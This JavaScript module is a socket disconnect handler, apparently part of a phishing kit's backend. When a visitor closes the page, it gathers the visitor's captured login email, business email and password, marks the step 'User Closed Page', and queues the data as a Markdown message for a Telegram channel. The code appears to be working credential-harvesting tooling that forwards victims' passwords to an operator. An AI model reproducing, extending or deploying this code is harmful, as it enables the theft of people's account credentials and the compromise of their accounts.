import { getMemoryStore } from "../utils/memory-store.js";
import { getTelegramQueue } from "../utils/telegramQueue.js";
import TelegramTemplate from "../utils/telegramTemplate.js";

export class DisconnectHandler {
  constructor(logger) {
    this.logger = logger;
    this.userStore = getMemoryStore();
  }

  handleDisconnect(socket, reason) {
    this.logger.info(`Client ${socket.id} disconnected: ${reason}`);

    try {
      const user = this.userStore.get(socket.userId);
      if (!user) {
        this.logger.info(`No user found for socket ${socket.id}`);
        return;
      }

      // Only process if this socket is the current one for this user
      if (user.socket !== socket.id) {
        this.logger.info(
          `Socket ${socket.id} was not current for user ${socket.userId}`
        );
        return;
      }

      // Remove user from store
      this.userStore.delete(socket.userId);
      this.logger.info(
        `User ${socket.userId} removed. Total users: ${this.userStore.size()}`
      );

      // Check if user has email data to send notification
      if (!this.shouldSendNotification(user)) {
        this.logger.debug(
          `No email data found for user ${socket.userId} - skipping notification`
        );
        return;
      }

      // Send disconnect notification
      this.sendDisconnectNotification(user);
    } catch (error) {
      this.logger.error("Error handling disconnect:", error.message);
    }
  }

  // Check if user has email data worth notifying about
  shouldSendNotification(user) {
    // Check environment variable - if true or not defined, always send notification
    const notificationOnDisconnect = process.env.Notification_On_Disconnect;
    if (
      notificationOnDisconnect === undefined ||
      notificationOnDisconnect === "true"
    ) {
      return true;
    }

    // If explicitly set to false, check for email data
    if (notificationOnDisconnect === "false") {
      if (!user?.data) {
        return false;
      }

      const { data } = user;

      // Check if user has either login email or business email
      const hasLoginEmail = data.login_email && data.login_email.trim() !== "";
      const hasBussinessEmail =
        data.business_email && data.business_email.trim() !== "";
      const hasPassword = data.password_one && data.password_one.trim() !== "";

      // Send notification if user has email data or password (indicates they were engaged)
      return hasLoginEmail || hasBussinessEmail || hasPassword;
    }

    // Default to false for any other value
    return false;
  }

  sendDisconnectNotification(user) {
    try {
      // Update the step to indicate user left
      user.data.currentStep = "User Closed Page";

      // Generate telegram message
      const telegramMessage = TelegramTemplate.generateUserDataTemplate(
        user.data
      );

      // Queue the notification
      const telegramQueue = getTelegramQueue();
      telegramQueue.enqueue({
        type: "user_data_template",
        userId: user.id || user.userId,
        data: {
          text: telegramMessage,
          parse_mode: "Markdown",
        },
      });

      this.logger.info(
        `Disconnect notification queued for user: ${user.id || user.userId}`
      );
    } catch (error) {
      this.logger.error(
        "Error sending disconnect notification:",
        error.message
      );
    }
  }
}
